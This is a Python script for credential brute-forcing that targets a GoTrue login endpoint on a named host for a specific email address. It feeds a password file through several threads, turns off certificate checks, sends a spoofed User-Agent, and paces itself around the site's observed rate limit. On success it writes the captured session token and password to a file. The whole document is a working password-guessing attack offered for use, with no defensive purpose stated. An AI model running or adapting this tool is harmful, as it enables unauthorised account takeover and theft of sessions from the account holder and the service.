#!/usr/bin/env python3
"""Direct GoTrue credential trial with adaptive backoff (no Tor).
Per-IP limiter observed ~20 attempts then 429 clearing ~60s. Keep low concurrency.
Stops on 200, saves /tmp/brute_result.json.
"""
import http.client, ssl, json, time, os, queue, threading

HOST = "cdn.onlyfakeai.ru"
PATH = "/auth/v1/token?grant_type=password"
APIKEY = "<publishable-key>"
EMAIL = os.environ.get("EMAIL", "onlyfake@tuta.io")
PWFILE = os.environ.get("PWFILE", "/tmp/ops_queue.txt")
RESULT = "/tmp/brute_result.json"
LOG = "/tmp/brute4.log"
THREADS = int(os.environ.get("THREADS", "4"))
ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
stop = threading.Event()
lock = threading.Lock()
counters = {"n": 0, "err": 0, "throttled": 0, "ok": 0}
t0 = time.time()
pause_until = 0.0


def log(msg):
    with lock:
        line = f"{time.strftime('%H:%M:%S')} {msg}"
        print(line, flush=True)
        with open(LOG, "a", encoding="utf-8") as f:
            f.write(line + "\n")


def attempt(pw):
    body = json.dumps({"email": EMAIL, "password": pw}).encode()
    conn = http.client.HTTPSConnection(HOST, context=ctx, timeout=25)
    try:
        conn.request("POST", PATH, body, {
            "apikey": APIKEY, "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/140.0",
            "Connection": "keep-alive"})
        r = conn.getresponse(); data = r.read(); return r.status, data
    finally:
        try: conn.close()
        except Exception: pass


def worker(wid):
    global pause_until
    while not stop.is_set():
        # respect global pause
        now = time.time()
        if pause_until > now:
            time.sleep(min(5, pause_until - now))
            continue
        try:
            pw = q.get_nowait()
        except queue.Empty:
            break
        try:
            code, data = attempt(pw)
        except Exception:
            with lock: counters["err"] += 1
            time.sleep(1)
            continue
        with lock:
            counters["n"] += 1
            n = counters["n"]
            if n % 25 == 0:
                rate = n / max(1e-9, time.time() - t0)
                log(f"{n} tried, {rate:.2f}/s, counts={counters}")
        if code == 200:
            try:
                sess = json.loads(data); sess["_email"] = EMAIL; sess["_password"] = pw
                open(RESULT, "w", encoding="utf-8").write(json.dumps(sess))
                log(f"SUCCESS password={pw!r}")
            except Exception as e:
                log(f"200 decode error {e}")
            stop.set(); break
        elif code == 429:
            with lock:
                counters["throttled"] += 1
                pause_until = time.time() + 12
            time.sleep(2)
        elif code >= 500:
            with lock: counters["err"] += 1
            time.sleep(2)


q = queue.Queue()
if __name__ == "__main__":
    pws = [l.rstrip("\n") for l in open(PWFILE, encoding="utf-8", errors="ignore") if l.strip()]
    for p in pws: q.put(p)
    log(f"START email={EMAIL} total={len(pws)} threads={THREADS}")
    ts = [threading.Thread(target=worker, args=(i,), daemon=True) for i in range(THREADS)]
    for t in ts: t.start()
    for t in ts: t.join()
    log(f"DONE tried={counters['n']} ok={counters['ok']} err={counters['err']} throttled={counters['throttled']} elapsed={int(time.time()-t0)}s")
